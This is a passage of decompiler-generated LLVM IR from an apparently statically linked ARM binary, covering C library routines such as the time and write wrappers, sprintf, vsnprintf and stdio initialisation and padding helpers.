  br label %dec_label_pc_12afc

dec_label_pc_12ad8:                               ; preds = %.thread, %bb
  %v7_12ad8 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_12ad8, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_12ad8, -4095
  br i1 %tmp13, label %dec_label_pc_12af8, label %dec_label_pc_12ae8

dec_label_pc_12ae8:                               ; preds = %dec_label_pc_12ad8
  %v0_12ae8 = call i32 @__errno_location()
  %v0_12aec = load i32, i32* %r4.global-to-local, align 4
  %v1_12aec = sub i32 0, %v0_12aec
  %v2_12af0 = inttoptr i32 %v0_12ae8 to i32*
  store i32 %v1_12aec, i32* %v2_12af0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12af8

dec_label_pc_12af8:                               ; preds = %dec_label_pc_12ad8, %dec_label_pc_12ae8
  %v0_12af8 = phi i32 [ %v7_12ad8, %dec_label_pc_12ad8 ], [ -1, %dec_label_pc_12ae8 ]
  store i32 %v0_12af8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12afc

dec_label_pc_12afc:                               ; preds = %dec_label_pc_12ac4, %dec_label_pc_12af8
  %v0_12afc = phi i32 [ %v0_12afc.pre, %dec_label_pc_12ac4 ], [ %v0_12af8, %dec_label_pc_12af8 ]
  %v2_12b00 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12b00, i32* @r4, align 4
  ret i32 %v0_12afc

; uselistorder directives
  uselistorder i32 %v7_12ad8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_12afc, { 1, 0 }
  uselistorder label %dec_label_pc_12af8, { 1, 0 }
  uselistorder label %dec_label_pc_12ad8, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12b04 = load i32, i32* @r4, align 4
  store i32 %v3_12b04, i32* %stack_var_-8, align 4
  %v2_12b08 = call i32 @time(i32* %arg1)
  store i32 %v2_12b08, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_12b08, -4095
  br i1 %tmp, label %dec_label_pc_12b28, label %dec_label_pc_12b18

dec_label_pc_12b18:                               ; preds = %entry
  %v0_12b18 = call i32 @__errno_location()
  %v0_12b1c = load i32, i32* %r4.global-to-local, align 4
  %v1_12b1c = sub i32 0, %v0_12b1c
  %v2_12b20 = inttoptr i32 %v0_12b18 to i32*
  store i32 %v1_12b1c, i32* %v2_12b20, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12b28

dec_label_pc_12b28:                               ; preds = %entry, %dec_label_pc_12b18
  %v0_12b28 = phi i32 [ %v2_12b08, %entry ], [ -1, %dec_label_pc_12b18 ]
  %v2_12b2c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12b2c, i32* @r4, align 4
  ret i32 %v0_12b28

; uselistorder directives
  uselistorder i32 %v2_12b08, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12b28, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_12b34 = call i32 @wait4()
  ret i32 %v0_12b34
}

define i32 @__libc_write(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12b38 = load i32, i32* @r4, align 4
  store i32 %v3_12b38, i32* %stack_var_-8, align 4
  %v3_12b3c = load i32, i32* @r2, align 4
  %v4_12b3c = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_12b3c)
  store i32 %v4_12b3c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_12b3c, -4095
  br i1 %tmp, label %dec_label_pc_12b5c, label %dec_label_pc_12b4c

dec_label_pc_12b4c:                               ; preds = %entry
  %v0_12b4c = call i32 @__errno_location()
  %v0_12b50 = load i32, i32* %r4.global-to-local, align 4
  %v1_12b50 = sub i32 0, %v0_12b50
  %v2_12b54 = inttoptr i32 %v0_12b4c to i32*
  store i32 %v1_12b50, i32* %v2_12b54, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12b5c

dec_label_pc_12b5c:                               ; preds = %entry, %dec_label_pc_12b4c
  %v0_12b5c = phi i32 [ %v4_12b3c, %entry ], [ -1, %dec_label_pc_12b4c ]
  %v2_12b60 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12b60, i32* @r4, align 4
  ret i32 %v0_12b5c

; uselistorder directives
  uselistorder i32 %v4_12b3c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12b5c, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v2_12b68 = load i32, i32* @global_var_29594, align 4
  %v3_12b6c = mul i32 %arg1, 2
  %v4_12b6c = add i32 %v2_12b68, %v3_12b6c
  %v5_12b6c = inttoptr i32 %v4_12b6c to i8*
  %v6_12b6c = load i8, i8* %v5_12b6c, align 1
  %v8_12b6c = zext i8 %v6_12b6c to i32
  %v1_12b70 = and i32 %v8_12b6c, 32
  ret i32 %v1_12b70
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_12b84 = icmp slt i32 %arg1, 0
  br i1 %v1_12b84, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_12b84 = mul i32 %arg1, 2
  %v2_12b90 = load i32, i32* @global_var_2959c, align 4
  %v2_12b94 = add i32 %v2_12b90, %v2_12b84
  %v3_12b98 = inttoptr i32 %v2_12b94 to i8*
  %v4_12b98 = load i8, i8* %v3_12b98, align 1
  %v6_12b98 = zext i8 %v4_12b98 to i32
  %v1_12b9c = add i32 %v2_12b94, 1
  %v2_12b9c = inttoptr i32 %v1_12b9c to i8*
  %v3_12b9c = load i8, i8* %v2_12b9c, align 1
  %v4_12b9c = zext i8 %v3_12b9c to i32
  %v3_12ba0 = mul nuw i32 %v4_12b9c, 16777216
  %v4_12ba4 = sdiv i32 %v3_12ba0, 65536
  %v5_12ba4 = or i32 %v4_12ba4, %v6_12b98
  ret i32 %v5_12ba4

; uselistorder directives
  uselistorder i32 %v2_12b94, { 1, 0 }
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_2fb60.1026 to i32)
}

define i32 @sprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_12bc8 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_12bc8, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_12bdc = call i32 @__GI_vsnprintf()
  ret i32 %v0_12bdc

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_12bf0 = load i32, i32* @r4, align 4
  %v6_12bf0 = load i32, i32* @r5, align 4
  %v12_12bf0 = load i32, i32* @r7, align 4
  %v15_12bf0 = load i32, i32* @r8, align 4
  %v18_12bf0 = load i32, i32* @sl, align 4
  %v0_12bf4 = load i32, i32* @r3, align 4
  store i32 %v0_12bf4, i32* @r8, align 4
  %v2_12bf8 = ptrtoint i32* %stack_var_-108 to i32
  %v0_12c00 = load i32, i32* @r0, align 4
  %v1_12c00 = sub i32 -1, %v0_12c00
  store i32 %v1_12c00, i32* @r5, align 4
  store i32 %v0_12c00, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_12c14 = load i32, i32* @r1, align 4
  %v3_12c14 = icmp ult i32 %v1_12c00, %v1_12c14
  br i1 %v3_12c14, label %bb23, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_12c14, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %entry, %bb
  %v0_12c1c = load i32, i32* @r2, align 4
  store i32 %v0_12c1c, i32* @r7, align 4
  %v2_12c20 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_12c20, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
  %v0_12c3c = call i32 @__stdio_init_mutex()
  %v0_12c40 = load i32, i32* @r4, align 4
  %v1_12c40 = load i32, i32* @r5, align 4
  %v0_12c48 = load i32, i32* @r7, align 4
  %v0_12c4c = load i32, i32* @r8, align 4
  %v3_12c6c = inttoptr i32 %v0_12c48 to i8*
  %v4_12c6c = call i32 @_vfprintf_internal(i32 %v2_12bf8, i8* %v3_12c6c, i32 %v0_12c4c)
  %v0_12c70 = load i32, i32* @r5, align 4
  %v1_12c70 = load i32, i32* @sl, align 4
  %v9_12c70 = icmp eq i32 %v0_12c70, %v1_12c70
  br i1 %v9_12c70, label %dec_label_pc_12c98, label %dec_label_pc_12c7c

dec_label_pc_12c7c:                               ; preds = %bb23
  %v9_12c84 = icmp eq i32 %v1_12c40, 0
  %v1_12c88 = sext i1 %v9_12c84 to i32
  %v1_12c88.v0_12c64 = add i32 %v0_12c40, %v1_12c88
  %stack_var_-92.0 = inttoptr i32 %v1_12c88.v0_12c64 to i8*
  %v1_12c94 = trunc i32 %v1_12c70 to i8
  store i8 %v1_12c94, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_12c98

dec_label_pc_12c98:                               ; preds = %bb23, %dec_label_pc_12c7c
  store i32 %v3_12bf0, i32* @r4, align 4
  store i32 %v6_12bf0, i32* @r5, align 4
  store i32 %v12_12bf0, i32* @r7, align 4
  store i32 %v15_12bf0, i32* @r8, align 4
  store i32 %v18_12bf0, i32* @sl, align 4
  ret i32 %v4_12c6c

; uselistorder directives
  uselistorder i32 %v1_12c14, { 1, 0 }
  uselistorder i32 %v0_12c00, { 1, 0 }
  uselistorder label %dec_label_pc_12c98, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12ca0 = load i32, i32* @r4, align 4
  store i32 %v3_12ca0, i32* %stack_var_-24, align 4
  %v9_12ca0 = load i32, i32* @r6, align 4
  %v0_12ca4 = call i32 @__errno_location()
  store i32 ptrtoint (i8** @global_var_295ec.1021 to i32), i32* @r4, align 4
  %v3_12cac = load i8, i8* @global_var_295ed.1028, align 1
  %v4_12cac = zext i8 %v3_12cac to i32
  %v2_12cb0 = load i8, i8* bitcast (i8** @global_var_295ec.1021 to i8*), align 4
  %v3_12cb0 = zext i8 %v2_12cb0 to i32
  store i32 %v0_12ca4, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_12cbc = mul nuw nsw i32 %v4_12cac, 256
  %v5_12cbc = or i32 %v3_12cb0, %v4_12cbc
  store i32 %v5_12cbc, i32* @r6, align 4
  %v1_12cc0 = inttoptr i32 %v0_12ca4 to i32*
  %v2_12cc0 = load i32, i32* %v1_12cc0, align 4
  store i32 %v2_12cc0, i32* %r8.global-to-local, align 4
  %v1_12cc4 = call i32 @isatty(i32 0)
  %v1_12cc8 = sub i32 1, %v1_12cc4
  %v0_12ccc = load i32, i32* @r6, align 4
  %v4_12ccc = mul i32 %v1_12cc8, 256
  %v5_12ccc = xor i32 %v4_12ccc, %v0_12ccc
  %v3_12cd0 = load i8, i8* @global_var_2963d.1029, align 1
  %v4_12cd0 = zext i8 %v3_12cd0 to i32
  %v3_12cd4 = load i8, i8* @global_var_2963c.1022, align 1
  %v4_12cd4 = zext i8 %v3_12cd4 to i32
  %v3_12cd8 = sdiv i32 %v5_12ccc, 256
  store i32 1, i32* @r0, align 4
  %v4_12ce0 = mul nuw nsw i32 %v4_12cd0, 256
  %v5_12ce0 = or i32 %v4_12cd4, %v4_12ce0
  store i32 %v5_12ce0, i32* @r5, align 4
  %v1_12ce4 = trunc i32 %v3_12cd8 to i8
  store i8 %v1_12ce4, i8* @global_var_295ed.1028, align 1
  %v1_12ce8 = trunc i32 %v0_12ccc to i8
  %v2_12ce8 = load i32, i32* @r4, align 4
  %v3_12ce8 = inttoptr i32 %v2_12ce8 to i8*
  store i8 %v1_12ce8, i8* %v3_12ce8, align 1
  %v1_12cec = call i32 @isatty(i32 1)
  %v1_12cf0 = sub i32 1, %v1_12cec
  %v0_12cf4 = load i32, i32* @r5, align 4
  %v4_12cf4 = mul i32 %v1_12cf0, 256
  %v5_12cf4 = xor i32 %v4_12cf4, %v0_12cf4
  store i32 %v5_12cf4, i32* %r5.global-to-local, align 4
  %v3_12cf8 = sdiv i32 %v5_12cf4, 256
  %v1_12cfc = trunc i32 %v3_12cf8 to i8
  store i8 %v1_12cfc, i8* @global_var_2963d.1029, align 1
  %v0_12d00 = load i32, i32* %r8.global-to-local, align 4
  %v1_12d00 = load i32, i32* @r7, align 4
  %v2_12d00 = inttoptr i32 %v1_12d00 to i32*
  store i32 %v0_12d00, i32* %v2_12d00, align 4
  %v0_12d04 = load i32, i32* %r5.global-to-local, align 4
  %v1_12d04 = trunc i32 %v0_12d04 to i8
  store i8 %v1_12d04, i8* @global_var_2963c.1022, align 1
  %v2_12d08 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12d08, i32* @r4, align 4
  store i32 %v9_12ca0, i32* @r6, align 4
  ret i32 %v1_12cf0

; uselistorder directives
  uselistorder i32 %v1_12cf0, { 1, 0 }
  uselistorder i32 %v0_12ccc, { 1, 0 }
  uselistorder i8* @global_var_2963c.1022, { 1, 0 }
  uselistorder i8* @global_var_2963d.1029, { 1, 0 }
  uselistorder i8* @global_var_295ed.1028, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1fea8.1031 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_12d18 = call i32 @memcpy()
  %v0_12d1c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12d1c, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v1_12d1c = load i32, i32* @r1, align 4
  %v2_12d1c = load i32, i32* @r8, align 4
  %v5_12d1c = udiv i32 %v2_12d1c, 536870912
  %v6_12d1c = and i32 %v5_12d1c, %v1_12d1c
  call void @__pseudo_branch(i32 %v6_12d1c)
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_12d18

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12d20 = load i32, i32* @r4, align 4
  store i32 %v3_12d20, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_295b8.1033 to i32), i32* @r0, align 4
  %v0_12d28 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_295d0.1035 to i32), i32* @r0, align 4
  %v0_12d30 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32** @global_var_295b4.1037 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_295b4.1037 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_12d8c6 = add i32 %storemerge5, 56
  store i32 %v1_12d8c6, i32* @r5, align 4
  %v2_12d908 = icmp eq i32 %storemerge5, 0
  store i32 %v1_12d8c6, i32* %r0.global-to-local, align 4
  br i1 %v2_12d908, label %dec_label_pc_12d9c, label %dec_label_pc_12d40

dec_label_pc_12d40:                               ; preds = %entry, %dec_label_pc_12d7c
  store i32 ptrtoint (i8* @global_var_15d30.1039 to i32), i32* %r3.global-to-local, align 4
  store i32 77132, i32* @lr, align 4
  %v1_12d48 = call i32 @__pthread_return_0()
  %v2_12d4c = icmp eq i32 %v1_12d48, 0
  %v0_12d50 = load i32, i32* @r5, align 4
  store i32 %v0_12d50, i32* @r0, align 4
  br i1 %v2_12d4c, label %dec_label_pc_12d7c, label %dec_label_pc_12d58

dec_label_pc_12d58:                               ; preds = %dec_label_pc_12d40
  %v0_12d58 = load i32, i32* @r4, align 4
  %v1_12d58 = add i32 %v0_12d58, 8
  %v2_12d58 = inttoptr i32 %v1_12d58 to i32*
  %v3_12d58 = load i32, i32* %v2_12d58, align 4
  store i32 %v3_12d58, i32* %r3.global-to-local, align 4
  %v3_12d60 = inttoptr i32 %v0_12d58 to i8*
  store i8 48, i8* %v3_12d60, align 1
  %v2_12d68 = load i32, i32* @r4, align 4
  %v3_12d68 = add i32 %v2_12d68, 1
  %v4_12d68 = inttoptr i32 %v3_12d68 to i8*
  store i8 0, i8* %v4_12d68, align 1
  %v0_12d6c = load i32, i32* %r3.global-to-local, align 4
  %v1_12d6c = load i32, i32* @r4, align 4
  %v2_12d6c = add i32 %v1_12d6c, 20
  %v3_12d6c = inttoptr i32 %v2_12d6c to i32*
  store i32 %v0_12d6c, i32* %v3_12d6c, align 4
  %v0_12d70 = load i32, i32* %r3.global-to-local, align 4
  %v1_12d70 = load i32, i32* @r4, align 4
  %v2_12d70 = add i32 %v1_12d70, 24
  %v3_12d70 = inttoptr i32 %v2_12d70 to i32*
  store i32 %v0_12d70, i32* %v3_12d70, align 4
  %v0_12d74 = load i32, i32* %r3.global-to-local, align 4
  %v1_12d74 = load i32, i32* @r4, align 4
  %v2_12d74 = add i32 %v1_12d74, 28
  %v3_12d74 = inttoptr i32 %v2_12d74 to i32*
  store i32 %v0_12d74, i32* %v3_12d74, align 4
  %v0_12d78 = load i32, i32* %r3.global-to-local, align 4
  %v1_12d78 = load i32, i32* @r4, align 4
  %v2_12d78 = add i32 %v1_12d78, 16
  %v3_12d78 = inttoptr i32 %v2_12d78 to i32*
  store i32 %v0_12d78, i32* %v3_12d78, align 4
  br label %dec_label_pc_12d7c

dec_label_pc_12d7c:                               ; preds = %dec_label_pc_12d40, %dec_label_pc_12d58
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_12d80 = load i32, i32* @r4, align 4
  %v2_12d80 = add i32 %v1_12d80, 52
  %v3_12d80 = inttoptr i32 %v2_12d80 to i32*
  store i32 1, i32* %v3_12d80, align 4
  %v0_12d84 = call i32 @__stdio_init_mutex()
  store i32 %v0_12d84, i32* %r0.global-to-local, align 4
  %v0_12d88 = load i32, i32* @r4, align 4
  %v1_12d88 = add i32 %v0_12d88, 32
  %v2_12d88 = inttoptr i32 %v1_12d88 to i32*
  %storemerge = load i32, i32* %v2_12d88, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_12d8c = add i32 %storemerge, 56
  store i32 %v1_12d8c, i32* @r5, align 4
  %v2_12d90 = icmp eq i32 %storemerge, 0
  store i32 %v1_12d8c, i32* %r0.global-to-local, align 4
  br i1 %v2_12d90, label %dec_label_pc_12d8c.dec_label_pc_12d9c_crit_edge, label %dec_label_pc_12d40

dec_label_pc_12d8c.dec_label_pc_12d9c_crit_edge:  ; preds = %dec_label_pc_12d7c
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_295b4.1037 to i32*), align 4
  br label %dec_label_pc_12d9c

dec_label_pc_12d9c:                               ; preds = %dec_label_pc_12d8c.dec_label_pc_12d9c_crit_edge, %entry
  %v11_12dc413 = phi i32 [ %v1_12d8c, %dec_label_pc_12d8c.dec_label_pc_12d9c_crit_edge ], [ %v1_12d8c6, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_12d8c.dec_label_pc_12d9c_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32** @global_var_295b4.1037 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_12dbc4 = icmp eq i32 %storemerge12, 0
  br i1 %v2_12dbc4, label %dec_label_pc_12dc4, label %dec_label_pc_12da8

dec_label_pc_12da8:                               ; preds = %dec_label_pc_12d9c, %dec_label_pc_12da8
  %v0_12db0 = phi i32 [ %storemerge1, %dec_label_pc_12da8 ], [ %storemerge12, %dec_label_pc_12d9c ]
  %v1_12da8 = inttoptr i32 %v0_12db0 to i8*
  %v2_12da8 = load i8, i8* %v1_12da8, align 1
  %v3_12da8 = zext i8 %v2_12da8 to i32
  store i32 %v3_12da8, i32* %r3.global-to-local, align 4
  %v1_12dac = and i32 %v3_12da8, 64
  store i32 %v0_12db0, i32* %r0.global-to-local, align 4
  store i32 77240, i32* @lr, align 4
  %v1_12db4 = icmp ne i32 %v1_12dac, 0
  call void @__pseudo_cond_branch(i1 %v1_12db4, i32 ptrtoint (i32* @global_var_12dd8.1040 to i32))
  %v0_12db8 = load i32, i32* %r4.global-to-local, align 4
  %v1_12db8 = add i32 %v0_12db8, 32
  %v2_12db8 = inttoptr i32 %v1_12db8 to i32*
  %storemerge1 = load i32, i32* %v2_12db8, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_12dbc = icmp eq i32 %storemerge1, 0
  br i1 %v2_12dbc, label %dec_label_pc_12dbc.dec_label_pc_12dc4_crit_edge, label %dec_label_pc_12da8

dec_label_pc_12dbc.dec_label_pc_12dc4_crit_edge:  ; preds = %dec_label_pc_12da8
  %v11_12dc4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12dc4

dec_label_pc_12dc4:                               ; preds = %dec_label_pc_12dbc.dec_label_pc_12dc4_crit_edge, %dec_label_pc_12d9c
  %v11_12dc4 = phi i32 [ %v11_12dc4.pre, %dec_label_pc_12dbc.dec_label_pc_12dc4_crit_edge ], [ %v11_12dc413, %dec_label_pc_12d9c ]
  %v2_12dc4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12dc4, i32* @r4, align 4
  ret i32 %v11_12dc4

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12da8, { 1, 0 }
  uselistorder label %dec_label_pc_12d7c, { 1, 0 }
  uselistorder label %dec_label_pc_12d40, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12dd8 = load i32, i32* @r4, align 4
  store i32 %v3_12dd8, i32* %stack_var_-8, align 4
  %v0_12ddc = load i32, i32* @r0, align 4
  %v1_12ddc = add i32 %v0_12ddc, 8
  %v2_12ddc = inttoptr i32 %v1_12ddc to i32*
  %v3_12ddc = load i32, i32* %v2_12ddc, align 4
  %v1_12de0 = add i32 %v0_12ddc, 16
  %v2_12de0 = inttoptr i32 %v1_12de0 to i32*
  %v3_12de0 = load i32, i32* %v2_12de0, align 4
  %v9_12de4 = icmp eq i32 %v3_12de0, %v3_12ddc
  store i32 %v0_12ddc, i32* %r4.global-to-local, align 4
  br i1 %v9_12de4, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_12ddc, i32* %v2_12de0, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  store i32 77304, i32* @lr, align 4
  %v1_12df4 = xor i1 %v9_12de4, true
  call void @__pseudo_cond_branch(i1 %v1_12df4, i32 ptrtoint (i32* @global_var_16418.1041 to i32))
  %v0_12df8 = load i32, i32* %r4.global-to-local, align 4
  %v1_12df8 = add i32 %v0_12df8, 8
  %v2_12df8 = inttoptr i32 %v1_12df8 to i32*
  %v3_12df8 = load i32, i32* %v2_12df8, align 4
  %v1_12dfc = add i32 %v0_12df8, 16
  %v2_12dfc = inttoptr i32 %v1_12dfc to i32*
  %v3_12dfc = load i32, i32* %v2_12dfc, align 4
  %v2_12e00 = sub i32 %v3_12dfc, %v3_12df8
  %v2_12e04 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12e04, i32* @r4, align 4
  ret i32 %v2_12e00

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v3_12e08 = load i32, i32* @r4, align 4
  %v6_12e08 = load i32, i32* @r5, align 4
  %v9_12e08 = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_12e282 = icmp eq i32 %arg3, 0
  %v2_12e2c = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_12e282, label %dec_label_pc_12e48, label %dec_label_pc_12e3c

dec_label_pc_12e24:                               ; preds = %dec_label_pc_12e3c
  %v1_12e24 = add i32 %v0_12e24, -1
  store i32 %v1_12e24, i32* @r4, align 4
  %v2_12e28 = icmp eq i32 %v1_12e24, 0
  %v0_12e34 = load i32, i32* @r6, align 4
  br i1 %v2_12e28, label %dec_label_pc_12e48.loopexit, label %dec_label_pc_12e3c

dec_label_pc_12e3c:                               ; preds = %entry, %dec_label_pc_12e24
  %v0_12e344 = phi i32 [ %v0_12e34, %dec_label_pc_12e24 ], [ %arg1, %entry ]
  %v3_12e3c = call i32 @__stdio_fwrite(i32 %v2_12e2c, i32 1, i32 %v0_12e344)
  %v7_12e40 = icmp eq i32 %v3_12e3c, 1
  %v0_12e24 = load i32, i32* @r4, align 4
  br i1 %v7_12e40, label %dec_label_pc_12e24, label %dec_label_pc_12e48.loopexit

dec_label_pc_12e48.loopexit:                      ; preds = %dec_label_pc_12e24, %dec_label_pc_12e3c
  %v0_12e48.ph = phi i32 [ %v0_12e24, %dec_label_pc_12e3c ], [ 0, %dec_label_pc_12e24 ]
  %v1_12e48.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12e48

dec_label_pc_12e48:                               ; preds = %dec_label_pc_12e48.loopexit, %entry
  %v1_12e48 = phi i32 [ 0, %entry ], [ %v1_12e48.pre, %dec_label_pc_12e48.loopexit ]
  %v0_12e48 = phi i32 [ 0, %entry ], [ %v0_12e48.ph, %dec_label_pc_12e48.loopexit ]
  %v2_12e48 = sub i32 %v1_12e48, %v0_12e48
  store i32 %v3_12e08, i32* @r4, align 4
  store i32 %v6_12e08, i32* @r5, align 4
  store i32 %v9_12e08, i32* @r6, align 4
  ret i32 %v2_12e48

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12e48.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_12e3c, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12e54 = load i32, i32* @r4, align 4
  store i32 %v3_12e54, i32* %stack_var_-24, align 4
  %v9_12e54 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_12e5c = and i32 %arg2, 128
  %v2_12e5c = icmp eq i32 %v1_12e5c, 0
  %v0_12e60 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12e60, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_12e5c, label %bb, label %dec_label_pc_12e74

bb:                                               ; preds = %entry
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12eb4

dec_label_pc_12e74:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_12e78 = call i32 @strlen(i8* %arg4)
  store i32 %v3_12e78, i32* %r0.global-to-local, align 4
  %v1_12e7c = load i32, i32* %r4.global-to-local, align 4
  %v2_12e7c = sub i32 %v1_12e7c, %v3_12e78
  store i32 %v2_12e7c, i32* @r4, align 4
  store i32 %v3_12e78, i32* @r5, align 4
  %tmp16 = icmp slt i32 %v2_12e7c, 1
  br i1 %tmp16, label %.thread, label %dec_label_pc_12e94

.thread:                                          ; preds = %dec_label_pc_12e74
  store i32 %v3_12e78, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12eb4

dec_label_pc_12e94:                               ; preds = %dec_label_pc_12e74
  %v0_12e94 = load i32, i32* @r6, align 4
  %v1_12e94 = urem i32 %v0_12e94, 128
  %v0_12e98 = load i32, i32* @r8, align 4
  store i32 %v0_12e98, i32* %r0.global-to-local, align 4
  %v3_12ea0 = trunc i32 %v1_12e94 to i8
  %v4_12ea0 = call i32 @_charpad(i32 %v0_12e98, i8 %v3_12ea0, i32 %v2_12e7c)
  store i32 %v4_12ea0, i32* %r0.global-to-local, align 4
  %v1_12ea4 = load i32, i32* @r4, align 4
  %v9_12ea4 = icmp eq i32 %v4_12ea0, %v1_12ea4
  store i32 %v4_12ea0, i32* %r6.global-to-local, align 4
  br i1 %v9_12ea4, label %dec_label_pc_12eb0, label %dec_label_pc_12ed0

dec_label_pc_12eb0:                               ; preds = %dec_label_pc_12e94
  %v0_12eb0 = load i32, i32* @r5, align 4
  store i32 %v0_12eb0, i32* %r4.global-to-local, align 4
